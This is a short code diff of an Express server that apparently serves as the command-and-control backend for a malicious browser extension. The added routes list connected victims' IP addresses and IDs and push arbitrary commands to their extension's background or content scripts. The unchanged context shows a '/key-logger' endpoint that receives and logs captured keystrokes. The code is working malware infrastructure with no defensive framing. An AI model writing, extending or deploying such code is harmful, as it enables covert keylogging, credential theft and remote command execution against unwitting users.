@@ -12,6 +12,44 @@ app.use(cors())
 // Middleware to parse JSON bodies
 app.use(express.json());
 
+app.get('/clients', (req, res) => {
+    res.json(Array.from(CLIENTS).map(client => {
+        return {
+                ip: client._socket.remoteAddress,
+                uid: client.uid
+            }
+        })
+    )
+})
+
+app.post(`/clients/send-command`, (req, res) => {
+    if (!req.body.command) {
+        res.status(400).send('Bad request')
+    }
+
+    const message = {
+        data: req.body.command,
+        type: []
+    }
+
+    if (req.body.type.includes('BACKGROUND')) {
+        message.type.push('BG_COMMAND')
+    }
+    if (req.body.type.includes('CONTENT-SCRIPT')) {
+        message.type.push('CS_COMMAND')
+    }
+
+    const jsonMessage = JSON.stringify(message)
+
+    const clients = Array.from(CLIENTS).filter((client) => req.body.clients.includes(client.uid))
+
+    clients.forEach(client => {
+        client.send(jsonMessage)
+    })
+    res.status(200).send('Command sent')
+})
+
+
 // POST request handler
 app.post('/key-logger', (req, res) => {
     console.log(req.body); // Logs the request body to the console
